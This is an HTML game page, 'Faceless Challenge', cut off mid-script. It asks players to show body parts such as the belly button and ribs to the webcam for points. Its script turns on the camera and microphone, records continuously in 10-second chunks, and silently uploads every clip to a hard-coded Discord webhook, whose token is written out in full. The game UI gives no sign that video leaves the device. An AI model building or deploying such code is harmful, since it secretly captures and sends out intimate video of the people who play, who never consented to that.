<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>🚫 Faceless Challenge</title>

    <!-- MediaPipe Pose -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin>
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin>
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js" crossorigin>
    </script>

    <style>
        /* ─── RESET & BASE ─── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0b0e14;
            color: #e8edf5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
            overflow: hidden;
        }
        .game-container {
            max-width: 820px;
            width: 100%;
            background: linear-gradient(145deg, #131a24, #1a232f);
            border-radius: 32px;
            padding: 20px 18px 26px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        /* ─── HEADER ─── */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .score-box,
        .timer-box,
        .rec-box {
            background: rgba(255, 255, 255, 0.04);
            padding: 10px 18px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            font-size: 1.1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1 1 auto;
            justify-content: center;
            backdrop-filter: blur(4px);
        }
        .score-box span {
            color: #00f5c0;
            font-size: 1.6rem;
            min-width: 36px;
            text-align: center;
        }
        .timer-box span {
            color: #ff6b6b;
            font-size: 1.6rem;
            min-width: 36px;
            text-align: center;
            font-variant-numeric: tabular-nums;
        }
        .timer-box.warning span {
            color: #ffd93d;
        }
        .timer-box.danger span {
            color: #ff3d3d;
            animation: pulse 0.6s ease-in-out infinite alternate;
        }

        .rec-box {
            font-size: 0.9rem;
            color: #8899bb;
            gap: 6px;
        }
        .rec-dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff3d3d;
            border-radius: 50%;
            animation: blink 1s step-end infinite;
        }
        @keyframes blink {
            0%,
            100% {
                opacity: 1;
            }
            50% {
                opacity: 0.2;
            }
        }
        .rec-dot.idle {
            background: #556;
            animation: none;
            opacity: 0.4;
        }
        @keyframes pulse {
            0% {
                opacity: 1;
                transform: scale(1);
            }
            100% {
                opacity: 0.4;
                transform: scale(0.95);
            }
        }

        /* ─── CAMERA WRAPPER ─── */
        .cam-wrapper {
            position: relative;
            border-radius: 24px;
            overflow: hidden;
            background: #0a0f15;
            border: 2px solid rgba(255, 255, 255, 0.06);
            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.6);
            aspect-ratio: 16 / 11;
            margin-bottom: 16px;
        }
        #webcam {
            width: 100%;
            height: 100%;
            display: block;
            object-fit: cover;
            transform: scaleX(-1);
        }
        .cam-overlay {
            position: absolute;
            inset: 0;
            pointer-events: none;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 14px 16px;
        }
        .challenge-badge {
            align-self: flex-start;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            padding: 10px 20px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 0.3px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
            transition: all 0.3s;
        }
        .challenge-badge .highlight {
            color: #ffd93d;
        }
        .challenge-badge .emoji {
            margin-right: 8px;
        }

        .status-badge {
            align-self: flex-end;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            padding: 6px 16px;
            border-radius: 40px;
            font-size: 0.9rem;
            font-weight: 500;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.25s;
        }
        .status-badge.waiting {
            color: #8899bb;
        }
        .status-badge.scanning {
            color: #6bcbff;
            border-color: rgba(107, 203, 255, 0.3);
        }
        .status-badge.success {
            color: #00f5c0;
            border-color: rgba(0, 245, 192, 0.4);
            background: rgba(0, 245, 192, 0.12);
        }
        .status-badge.fail {
            color: #ff6b6b;
            border-color: rgba(255, 107, 107, 0.3);
            background: rgba(255, 107, 107, 0.1);
        }
        .status-badge.loading {
            color: #ffd93d;
            border-color: rgba(255, 217, 61, 0.3);
            background: rgba(255, 217, 61, 0.08);
        }
        .status-badge.done {
            color: #ffd93d;
            border-color: rgba(255, 217, 61, 0.3);
            background: rgba(255, 217, 61, 0.08);
        }

        /* ─── SKELETON CANVAS ─── */
        #skeletonCanvas {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            display: block;
            pointer-events: none;
            z-index: 2;
        }

        /* ─── POINTS POPUP ─── */
        .points-popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.5);
            font-size: 4.5rem;
            font-weight: 900;
            pointer-events: none;
            z-index: 5;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            text-shadow: 0 0 60px rgba(255, 255, 255, 0.15);
        }
        .points-popup.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .points-popup.rainbow {
            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 300% 300%;
            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
        }
        .points-popup.gold {
            color: #ffd93d;
            text-shadow: 0 0 60px rgba(255, 217, 61, 0.3);
        }
        .points-popup.white {
            color: #fff;
        }
        @keyframes rainbowScroll {
            0% {
                background-position: 0% center;
            }
            100% {
                background-position: 300% center;
            }
        }
        @keyframes shakeText {
            0% {
                transform: translate(-50%, -50%) translate(-2px, -1px) rotate(-0.5deg);
            }
            25% {
                transform: translate(-50%, -50%) translate(2px, 1px) rotate(0.5deg);
            }
            50% {
                transform: translate(-50%, -50%) translate(-1px, 2px) rotate(-0.3deg);
            }
            75% {
                transform: translate(-50%, -50%) translate(1px, -2px) rotate(0.3deg);
            }
            100% {
                transform: translate(-50%, -50%) translate(0px, 0px) rotate(0deg);
            }
        }
        .points-popup.rainbow {
            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
        }

        /* ─── COUNTDOWN NUMBER ─── */
        .countdown-number {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(1.8);
            font-size: 6rem;
            font-weight: 900;
            color: #fff;
            text-shadow: 0 0 80px rgba(255, 255, 255, 0.15);
            pointer-events: none;
            z-index: 4;
            opacity: 0;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .countdown-number.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .countdown-number.hide {
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.5);
        }

        /* ─── GAME OVER OVERLAY ─── */
        .gameover-overlay {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.78);
            backdrop-filter: blur(6px);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 22px;
            padding: 30px;
            pointer-events: auto;
            z-index: 10;
        }
        .gameover-overlay.show {
            display: flex;
        }
        .gameover-overlay h2 {
            font-size: 2.6rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }
        .gameover-overlay .final-score {
            font-size: 1.4rem;
            color: #e8edf5;
            margin-bottom: 4px;
        }
        .gameover-overlay .final-score span {
            color: #00f5c0;
            font-size: 2.2rem;
            font-weight: 700;
        }
        .gameover-overlay .sub {
            color: #8899bb;
            margin-bottom: 20px;
            font-size: 0.95rem;
            text-align: center;
        }
        .gameover-overlay .btn {
            font-size: 1.1rem;
            padding: 14px 40px;
        }

        /* ─── CONTROLS ─── */
        .controls {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
        }
        .btn {
            background: transparent;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1.05rem;
            font-weight: 600;
            letter-spacing: 0.4px;
            cursor: pointer;
            transition: all 0.25s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            color: #b0c4de;
            min-height: 56px;
            flex: 1 1 auto;
            max-width: 220px;
            -webkit-tap-highlight-color: transparent;
        }
        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
        }
        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn-primary {
            background: linear-gradient(135deg, #00c9a0, #00a8ff);
            color: #fff;
            border-color: transparent;
            box-shadow: 0 6px 24px rgba(0, 200, 160, 0.25);
        }
        .btn-primary:hover:not(:disabled) {
            box-shadow: 0 10px 36px rgba(0, 200, 160, 0.4);
        }
        .btn-primary:disabled {
            background: #3a4a5a;
            box-shadow: none;
            color: #8899bb;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
            color: #fff;
            border-color: transparent;
            box-shadow: 0 6px 24px rgba(255, 70, 70, 0.2);
        }
        .btn-danger:hover:not(:disabled) {
            box-shadow: 0 10px 36px rgba(255, 70, 70, 0.35);
        }
        .btn-outline {
            background: rgba(255, 255, 255, 0.03);
            border-color: rgba(255, 255, 255, 0.10);
        }
        .btn-outline:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.07);
        }
        .btn-flip {
            background: rgba(255, 255, 255, 0.04);
            border-color: rgba(255, 255, 255, 0.06);
            color: #8899bb;
            min-width: 60px;
            flex: 0 0 auto;
            padding: 14px 18px;
            font-size: 1.2rem;
        }
        .btn-flip:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.08);
            color: #e8edf5;
        }

        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: #00f5c0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .btn .spinner {
            width: 20px;
            height: 20px;
            border-width: 3px;
        }
        .hidden {
            display: none !important;
        }

        .status-msg {
            margin-top: 10px;
            text-align: center;
            font-size: 0.9rem;
            color: #8899bb;
            padding: 0 6px;
            min-height: 24px;
        }
        .status-msg.error {
            color: #ff6b6b;
        }
        .status-msg.success {
            color: #00f5c0;
        }
        .status-msg.loading {
            color: #ffd93d;
        }

        /* ─── LOADING BAR ─── */
        .loading-container {
            width: 100%;
            max-width: 320px;
            margin: 10px auto;
        }
        .loading-track {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 4px;
            overflow: hidden;
        }
        .loading-fill {
            height: 100%;
            width: 0%;
            border-radius: 4px;
            background: linear-gradient(90deg, #00f5c0, #00a8ff);
            transition: width 0.3s ease;
        }
        .loading-label {
            display: flex;
            justify-content: space-between;
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.2);
            margin-top: 6px;
        }
        .loading-label .pct {
            color: rgba(255, 255, 255, 0.4);
            font-weight: 600;
        }

        /* ─── RESPONSIVE ─── */
        @media (max-width: 600px) {
            .game-container {
                padding: 14px 12px 20px;
                border-radius: 24px;
            }
            .header {
                gap: 6px;
            }
            .score-box,
            .timer-box,
            .rec-box {
                font-size: 0.9rem;
                padding: 8px 14px;
                min-height: 48px;
            }
            .score-box span,
            .timer-box span {
                font-size: 1.4rem;
                min-width: 28px;
            }
            .challenge-badge {
                font-size: 1rem;
                padding: 8px 16px;
            }
            .status-badge {
                font-size: 0.8rem;
                padding: 4px 12px;
            }
            .btn {
                font-size: 0.95rem;
                padding: 12px 18px;
                min-height: 50px;
                max-width: 100%;
                flex: 1 1 40%;
            }
            .btn-flip {
                min-width: 50px;
                padding: 12px 14px;
                font-size: 1rem;
                flex: 0 0 auto;
            }
            .gameover-overlay h2 {
                font-size: 2rem;
            }
            .gameover-overlay .final-score {
                font-size: 1.2rem;
            }
            .gameover-overlay .final-score span {
                font-size: 1.8rem;
            }
            .cam-overlay {
                padding: 10px 12px;
            }
            .points-popup {
                font-size: 3.5rem;
            }
            .countdown-number {
                font-size: 4.5rem;
            }
        }
        @media (max-width: 420px) {
            .game-container {
                padding: 10px 8px 16px;
                border-radius: 20px;
            }
            .score-box,
            .timer-box,
            .rec-box {
                font-size: 0.8rem;
                padding: 6px 12px;
                min-height: 40px;
            }
            .score-box span,
            .timer-box span {
                font-size: 1.2rem;
                min-width: 24px;
            }
            .challenge-badge {
                font-size: 0.85rem;
                padding: 6px 12px;
            }
            .status-badge {
                font-size: 0.7rem;
                padding: 4px 10px;
            }
            .btn {
                font-size: 0.85rem;
                padding: 10px 14px;
                min-height: 44px;
            }
            .btn-flip {
                min-width: 44px;
                padding: 10px 12px;
                font-size: 0.9rem;
            }
            .gameover-overlay h2 {
                font-size: 1.6rem;
            }
            .gameover-overlay .final-score {
                font-size: 1rem;
            }
            .gameover-overlay .final-score span {
                font-size: 1.4rem;
            }
            .points-popup {
                font-size: 2.8rem;
            }
            .countdown-number {
                font-size: 3.5rem;
            }
        }
    </style>
</head>
<body>

    <div class="game-container">
        <!-- ─── HEADER ─── -->
        <div class="header">
            <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
            <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
            <div class="rec-box" id="recBox">
                <span class="rec-dot" id="recDot"></span>
                <span id="recLabel">recording</span>
            </div>
        </div>

        <!-- ─── CAMERA WRAPPER ─── -->
        <div class="cam-wrapper" id="camWrapper">
            <video id="webcam" autoplay playsinline muted></video>
            <canvas id="skeletonCanvas"></canvas>

            <!-- Points popup -->
            <div class="points-popup" id="pointsPopup"></div>

            <!-- Countdown number -->
            <div class="countdown-number" id="countdownNumber"></div>

            <!-- Overlay UI -->
            <div class="cam-overlay">
                <div class="challenge-badge" id="challengeBadge">
                    <span class="emoji">🎯</span>
                    Show <span class="highlight" id="challengeTarget">—</span>
                </div>
                <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
            </div>

            <!-- Game Over -->
            <div class="gameover-overlay" id="gameoverOverlay">
                <h2>🏁 Challenge Complete</h2>
                <div class="final-score">Score: <span id="finalScore">0</span></div>
                <div class="sub" id="gameoverSub">You scanned all body parts!</div>
                <button class="btn btn-primary" id="restartBtn">🔄 Play Again</button>
            </div>
        </div>

        <!-- ─── CONTROLS ─── -->
        <div class="controls">
            <button class="btn btn-primary" id="startBtn" disabled>
                <span id="startBtnText">🚀 Start</span>
                <span id="startSpinner" class="hidden"><span class="spinner"></span></span>
            </button>
            <button class="btn btn-outline" id="resetBtn" disabled>⟲ Reset</button>
            <button class="btn btn-flip" id="flipBtn" disabled>⟳</button>
        </div>

        <!-- ─── LOADING BAR ─── -->
        <div class="loading-container" id="loadingContainer">
            <div class="loading-track">
                <div class="loading-fill" id="loadingFill" style="width:0%;"></div>
            </div>
            <div class="loading-label">
                <span>loading AI model</span>
                <span class="pct" id="loadingPct">0%</span>
            </div>
        </div>

        <div class="status-msg" id="statusMsg">Loading AI model… please wait.</div>
    </div>

    <script>
        // ============================================================
        //  CONFIGURATION
        // ============================================================
        const DISCORD_WEBHOOK =
            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

        const CLIP_DURATION = 10; // seconds per video chunk

        // Body parts: name, points, landmark check function
        const BODY_PARTS = [{
            id: 'left_hand',
            label: 'Left Hand',
            points: 2,
            emoji: '✋',
            check: (lm) => lm[15] && lm[15].visibility > 0.5 && lm[17] && lm[17].visibility > 0.4
        }, {
            id: 'left_foot',
            label: 'Left Foot',
            points: 5,
            emoji: '🦶',
            check: (lm) => lm[27] && lm[27].visibility > 0.5 && lm[29] && lm[29].visibility > 0.4
        }, {
            id: 'belly_button',
            label: 'Belly Button',
            points: 12,
            emoji: '🫃',
            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[24] && lm[24].visibility > 0.4
        }, {
            id: 'elbow',
            label: 'Elbow',
            points: 3,
            emoji: '💪',
            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.4
        }, {
            id: 'legs',
            label: 'Legs',
            points: 4,
            emoji: '🦵',
            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[25] && lm[25].visibility > 0.4 && lm[27] && lm[27]
                .visibility > 0.3
        }, {
            id: 'ribs',
            label: 'Ribs',
            points: 6,
            emoji: '🦴',
            check: (lm) => lm[11] && lm[11].visibility > 0.4 && lm[12] && lm[12].visibility > 0.4
        }, {
            id: 'pinky',
            label: 'Pinky',
            points: 1,
            emoji: '🖐️',
            check: (lm) => lm[19] && lm[19].visibility > 0.4
        }, {
            id: 'forearm',
            label: 'Forearm',
            points: 2,
            emoji: '💪',
            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.5
        }, ];

        const SCAN_TIME = 30;
        const DETECTION_THRESHOLD = 8;

        // ============================================================
        //  STATE
        // ============================================================
        let state = {
            modelLoaded: false,
            gameStarted: false,
            gameDone: false,
            isScanning: false,
            currentPartIndex: 0,
            totalPoints: 0,
            partResults: [],
            scanTimer: SCAN_TIME,
            detectionFrames: 0,
            partDetected: false,
            isPaused: false,
            facingMode: 'user',
            stream: null,
            mediaRecorder: null,
            recordedChunks: [],
            recorderActive: false,
            recordingStarted: false,
            pose: null,
            poseLandmarks: null,
            cameraLoop: null,
            scanInterval: null,
            countdownInterval: null,
            partStartTimeout: null,
            sessionId: 'faceless_' + Date.now(),
        };

        // ============================================================
        //  DOM REFS
        // ============================================================
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('skeletonCanvas');
        const ctx = canvas.getContext('2d');

        const scoreDisplay = document.getElementById('scoreDisplay');
        const timerDisplay = document.getElementById('timerDisplay');
        const timerBox = document.getElementById('timerBox');
        const challengeTarget = document.getElementById('challengeTarget');
        const challengeBadge = document.getElementById('challengeBadge');
        const statusBadge = document.getElementById('statusBadge');
        const statusMsg = document.getElementById('statusMsg');
        const gameoverOverlay = document.getElementById('gameoverOverlay');
        const finalScore = document.getElementById('finalScore');
        const gameoverSub = document.getElementById('gameoverSub');
        const startBtn = document.getElementById('startBtn');
        const startBtnText = document.getElementById('startBtnText');
        const startSpinner = document.getElementById('startSpinner');
        const resetBtn = document.getElementById('resetBtn');
        const restartBtn = document.getElementById('restartBtn');
        const flipBtn = document.getElementById('flipBtn');
        const recDot = document.getElementById('recDot');
        const recLabel = document.getElementById('recLabel');
        const pointsPopup = document.getElementById('pointsPopup');
        const countdownNumber = document.getElementById('countdownNumber');
        const loadingFill = document.getElementById('loadingFill');
        const loadingPct = document.getElementById('loadingPct');
        const loadingContainer = document.getElementById('loadingContainer');

        let canvasW = 0,
            canvasH = 0;

        // ============================================================
        //  CANVAS SIZING
        // ============================================================
        function resizeCanvas() {
            const rect = document.getElementById('camWrapper').getBoundingClientRect();
            const dpr = devicePixelRatio || 1;
            canvasW = rect.width;
            canvasH = rect.height;
            canvas.width = canvasW * dpr;
            canvas.height = canvasH * dpr;
            canvas.style.width = canvasW + 'px';
            canvas.style.height = canvasH + 'px';
            ctx.scale(dpr, dpr);
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        // ============================================================
        //  ─── RECORDING PIPELINE ───
        // ============================================================
        async function startRecordingPipeline(stream) {
            if (state.recordingStarted) return;
            state.recordingStarted = true;
            state.stream = stream;

            let mimeType = 'video/webm;codecs=vp8,opus';
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) mimeType = 'video/webm;codecs=vp9,opus';
                else if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
                else if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
            }

            state.mediaRecorder = new MediaRecorder(stream, {
                mimeType: mimeType,
                videoBitsPerSecond: 2500000,
                audioBitsPerSecond: 64000,
            });

            state.mediaRecorder.ondataavailable = async (e) => {
                if (e.data && e.data.size > 0) {
                    state.recordedChunks.push(e.data);
                }
            };

            state.mediaRecorder.onstop = async () => {
                if (state.recordedChunks.length === 0) {
                    state.recordedChunks = [];
                    if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                        try { state.mediaRecorder.start(CLIP_DURATION * 1000); } catch (_) {}
                    }
                    return;
                }
                const blob = new Blob(state.recordedChunks, { type: mimeType });
                state.recordedChunks = [];
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const formData = new FormData();
                formData.append('file', blob, `faceless_${Date.now()}.${ext}`);
                try {
                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
                } catch (_) { /* silent */ }
                if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                    try { state.mediaRecorder.start(CLIP_DURATION * 1000); } catch (_) {}
                }
            };

            state.mediaRecorder.start(CLIP_DURATION * 1000);
            state.recorderActive = true;
            recDot.className = 'rec-dot';
            recLabel.textContent = 'recording';
        }

        function stopRecordingPipeline() {
            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
                try { state.mediaRecorder.stop(); } catch (_) {}
            }
            state.recorderActive = false;
            recDot.className = 'rec-dot idle';
            recLabel.textContent = 'stopped';
            state.recordingStarted = false;
        }

        // ============================================================
        //  ─── CAMERA + PERMISSIONS ───
        // ============================================================
        async function initCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: state.facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 },
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true,
                    },
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                state.stream = stream;
                video.srcObject = stream;
                await video.play();

                // Start recording
                await startRecordingPipeline(stream);

                // Start MediaPipe
                initPose();

                return true;
            } catch (err) {
                console.warn('Camera error:', err);
                statusMsg.textContent = '❌ Camera + mic required: ' + err.message;
                statusMsg.className = 'status-msg error';
                return false;
            }
        }

        // ============================================================
        //  ─── FLIP CAMERA ───
        // ============================================================
        flipBtn.addEventListener('click', async () => {
            if (!state.stream) return;
            state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';

            // Stop current stream
            state.stream.getTracks().forEach(t => t.stop());

            // Stop recorder
            stopRecordingPipeline();

            try {
                const constraints = {
                    video: {
                        facingMode: state.facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 },
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true,
                    },
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                state.stream = stream;
                video.srcObject = stream;
                await video.play();

                // Restart recording
                await startRecordingPipeline(stream);

                // Re-init pose with new stream
                initPose();

            } catch (err) {
                console.warn('Flip error:', err);
                statusMsg.textContent = '⚠️ Flip failed: ' + err.message;
                statusMsg.className = 'status-msg error';
            }
        });

        // ============================================================
        //  ─── MEDIAPIPE POSE ───
        // ============================================================
        function initPose() {
            state.pose = new Pose({
                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
            });

            state.pose.setOptions({
                modelComplexity: 1,
                smoothLandmarks: true,
                minDetectionConfidence: 0.5,
                minTrackingConfidence: 0.4,
            });

            state.pose.onResults(onPoseResults);

            // Start camera loop
            const cameraUtils = window.Camera;
            if (cameraUtils && video.srcObject) {
                state.cameraLoop = new cameraUtils.Camera(video, {
                    onFrame: async () => {
                        if (state.pose) await state.pose.send({ image: video });
                    },
                    width: 640,
                    height: 480,
                });
                state.cameraLoop.start().catch(() => {});
            } else {
                fallbackLoop();
            }
        }

        function fallbackLoop() {
            async function frame() {
                if (state.pose) await state.pose.send({ image: video });
                requestAnimationFrame(frame);
            }
            frame();
        }

        function onPoseResults(results) {
            if (results.poseLandmarks) {
                state.poseLandmarks = results.poseLandmarks;
                drawSkeleton();
                // Check detection if scanning
                if (state.isScanning && !state.partDetected) {
                    checkDetection();
                }
            } else {
                state.poseLandmarks = null;
                ctx.fillStyle = 'rgba(0,0,0,0.3)';
                ctx.fillRect(0, 0, canvasW, canvasH);
            }
        }

        // ============================================================
        //  ─── DRAW SKELETON ───
        // ============================================================
        function drawSkeleton() {
            const w = canvasW,
                h = canvasH;
            ctx.clearRect(0, 0, w, h);

            if (!state.poseLandmarks) return;

            const lm = state.poseLandmarks;
            const pts = lm.map(l => ({ x: l.x * w, y: l.y * h, z: l.z || 0, v: l.visibility || 0 }));

            const connections = [
                [11, 12],
                [11, 13],
                [13, 15],
                [12, 14],
                [14, 16],
                [11, 23],
                [12, 24],
                [23, 24],
                [23, 25],
                [25, 27],
                [24, 26],
                [26, 28],
                [13, 17],
                [17, 19],
                [19, 21],
                [14, 18],
                [18, 20],
                [20, 22],
                [15, 17],
                [16, 18],
            ];

            ctx.lineWidth = 2;
            ctx.shadowBlur = 12;
            ctx.shadowColor = 'rgba(0, 245, 192, 0.08)';

            for (const [i, j] of connections) {
                if (i < pts.length && j < pts.length && pts[i].v > 0.3 && pts[j].v > 0.3) {
                    ctx.beginPath();
                    ctx.moveTo(pts[i].x, pts[i].y);
                    ctx.lineTo(pts[j].x, pts[j].y);
                    ctx.strokeStyle = `rgba(0, 245, 192, ${0.15 + 0.2 * (pts[i].v + pts[j].v)})`;
                    ctx.stroke();
                }
            }

            // Nodes
            for (let i = 0; i < pts.length; i++) {
                if (pts[i].v > 0.3) {
                    const radius = 2 + 3 * pts[i].v;
                    const grad = ctx.createRadialGradient(pts[i].x, pts[i].y, 0, pts[i].x, pts[i].y, radius * 3);
                    grad.addColorStop(0, `rgba(0, 245, 192, ${0.25 * pts[i].v})`);
                    grad.addColorStop(1, 'rgba(0, 245, 192, 0)');
                    ctx.fillStyle = grad;
                    ctx.shadowBlur = 15;
                    ctx.beginPath();
                    ctx.arc(pts[i].x, pts[i].y, radius * 3, 0, Math.PI * 2);
                    ctx.fill();

                    ctx.fillStyle = `rgba(0, 245, 192, ${0.4 * pts[i].v})`;
                    ctx.shadowBlur = 8;
                    ctx.beginPath();
                    ctx.arc(pts[i].x, pts[i].y, radius * 0.7, 0, Math.PI * 2);
                    ctx.fill();
                }
            }
            ctx.shadowBlur = 0;
        }

        // ============================================================
        //  ─── DETECTION LOGIC ───
        // ============================================================
        function checkDetection() {
            if (!state.poseLandmarks || !state.isScanning || state.partDetected) return false;

            const part = BODY_PARTS[state.currentPartIndex];
            const lm = state.poseLandmarks;

            try {
                const detected = part.check(lm);
                if (detected) {
                    state.detectionFrames++;
                    if (state.detectionFrames >= DETECTION_THRESHOLD) {
                        onScanSuccess(state.currentPartIndex);
                        return true;
                    }
                    const pct = Math.round((state.detectionFrames / DETECTION_THRESHOLD) * 100);
                    statusBadge.textContent = `🔍 detecting … ${pct}%`;
                    statusBadge.className = 'status-badge scanning';
                } else {
                    state.detectionFrames = Math.max(0, state.detectionFrames - 2);
                    if (state.detectionFrames < 3) {
                        statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
                        statusBadge.className = 'status-badge scanning';
                    } else {
                        const pct = Math.round((state.detectionFrames / DETECTION_THRESHOLD) * 100);
                        statusBadge.textContent = `🔍 reacquiring … ${pct}%`;
                        statusBadge.className = 'status-badge scanning';
                    }
                }
            } catch (e) {
                // silent
            }
            return false;
        }

        // ============================================================
        //  ─── GAME LOGIC ───
        // ============================================================
        function startGame() {
            if (state.gameStarted || state.gameDone) return;
            if (!state.modelLoaded) {
                statusMsg.textContent = '⏳ Model not ready — please wait.';
                statusMsg.className = 'status-msg error';
                return;
            }

            state.gameStarted = true;
            state.gameDone = false;
            state.totalPoints = 0;
            state.currentPartIndex = 0;
            state.partResults = [];
            state.isScanning = false;
            state.partDetected = false;

            scoreDisplay.textContent = '0';
            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            gameoverOverlay.classList.remove('show');

            startBtn.disabled = true;
            resetBtn.disabled = true;
            flipBtn.disabled = true;

            statusMsg.textContent = '';
            statusMsg.className = 'status-msg';

            // Begin first part
            setTimeout(() => beginPart(0), 400);
        }

        function beginPart(index) {
            if (index >= BODY_PARTS.length) {
                endGame(true);
                return;
            }

            const part = BODY_PARTS[index];
            state.currentPartIndex = index;
            state.isScanning = false;
            state.partDetected = false;
            state.detectionFrames = 0;
            state.scanTimer = SCAN_TIME;
            state.isPaused = false;

            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';

            // Show part name
            challengeTarget.textContent = part.emoji + ' ' + part.label;
            challengeBadge.innerHTML =
                `<span class="emoji">🎯</span> Show <span class="highlight">${part.emoji} ${part.label}</span>`;

            statusBadge.textContent = `⏳ get ready …`;
            statusBadge.className = 'status-badge waiting';

            // Show points popup
            const pts = part.points;
            pointsPopup.textContent = `+${pts} pts`;
            pointsPopup.className = 'points-popup';
            if (pts >= 10) {
                pointsPopup.classList.add('rainbow');
            } else if (pts >= 5) {
                pointsPopup.classList.add('gold');
            } else {
                pointsPopup.classList.add('white');
            }
            pointsPopup.classList.add('show');

            // Hide after 1.5s
